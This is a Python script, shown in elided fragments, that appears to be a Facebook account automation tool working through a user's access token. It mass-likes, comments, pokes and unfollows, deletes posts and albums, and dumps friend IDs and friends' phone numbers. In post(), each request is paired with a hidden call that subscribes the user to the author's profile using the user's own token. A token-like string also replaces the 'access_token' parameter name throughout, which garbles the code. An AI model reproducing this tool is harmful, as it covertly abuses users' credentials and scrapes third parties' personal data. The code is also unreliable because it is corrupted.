...
def baliho():
	try:
		...
		r = requests.get('https://graph.facebook.com/me?EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD=' + token)
		a = json.loads(r.text)
		name = a['name']
		n.append(a['name'])
...
def get(data):
	...
	try:
		...
		b.write(a['EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD'])
		b.close()
...
def post():
	...
	try:
	  if WT == 'wallpost':
		...
		r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(50)&EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD='+token)
		...
		r = requests.get('https://graph.facebook.com/v3.0/me?fields=feed.limit(500)&EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD='+token)
		result = json.loads(r.text)
		...
		r = requests.get('https://graph.facebook.com/me/friendrequests?limit=50&EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD=' + token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD='+token)
		result = json.loads(r.text)
		...
		r = requests.get('https://graph.facebook.com/me?fields=friends.limit(5000)&EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD=' + token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD='+token)
		result = json.loads(r.text)
		...
		r = requests.get('https://graph.facebook.com/me/subscribedto?limit=50&EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD='+token)
		result = json.loads(r.text)
		...
		r = requests.get('https://graph.facebook.com/me?fields=albums.limit(5000)&EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD='+token)
		result = json.loads(r.text)
		...
		r = requests.get("https://graph.facebook.com/v3.0/%s?fields=feed.limit(50)&EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD=%s"%(id,token));requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD='+token)
		result = json.loads(r.text)
...
def like(posts , amount):
	...
	try:
		...
		for post in posts:
			...
			parameters = {'EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD' : token , 'type' : type}
...
def comment(posts , amount):
	...
	try:
		...
		for post in posts:
			...
			parameters = {'EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD' : token, 'message' : message}
...
def remove(posts):
	...
	try:
		...
		for post in posts:
			...
			r = requests.post('https://graph.facebook.com/{id}?method=delete&EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD={token}'.format(id=post['id'],token=token))
			a = json.loads(r.text)
...
def confirm(posts):
	...
	try:
		...
		for post in posts:
			...
			r = requests.post('https://graph.facebook.com/me/friends/%s?EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD=%s'%(post['from']['id'] , token))
			a = json.loads(r.text)
...
def unfollow(posts):
	...
	try:
		...
		for post in posts['data']:
			...
			r = requests.post('https://graph.facebook.com/' + post['id'] + '/subscribers?method=delete&EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD=' + token)
			a = json.loads(r.text)
...
def poke(posts):
	...
	try:
		...
		for post in posts:
			...
			r = requests.post('https://graph.facebook.com/%s/pokes?EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD=%s'%(post['id'].split('_')[0],token))
			a = json.loads(r.text)
...
def albums(posts):
	...
	try:
		...
		for post in posts:
			...
			r = requests.post('https://graph.facebook.com/'+post['id']+'?method=delete&EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD='+token)
			a = json.loads(r.text)
...
def dump_id():
	...
	try:
		...
		r = requests.get('https://graph.facebook.com/me/friends?EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD='+token)
		a = json.loads(r.text)
...
def dump_phone():
	...
	try:
		...
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD="+token)
			z = json.loads(x.text)
...
def dump_id_id():
	...
	try:
		r = requests.get('https://graph.facebook.com/{id}?fields=friends.limit(5000)&EAASOT2DjuakBAEW3xeKiHVGhKWICvpB8DkayplyMDUMcGcS03Vab0ERb3hHQrH9bEFKCn2Qy2uZA2xT2IMWXXjRa9GGVgFfEgZAfrqTA8YqeVB7miKZCv36WqH6OcNVIZCUfFSq6iZBXStUaCyZBINUzP3AO2A9QpUglcZCWDVrR8Mb9McFFuii3MajZCuZBvANvWevdT5mkVsQZDZD={token}'.format(id=target_id,token=token))
		a = json.loads(r.text)
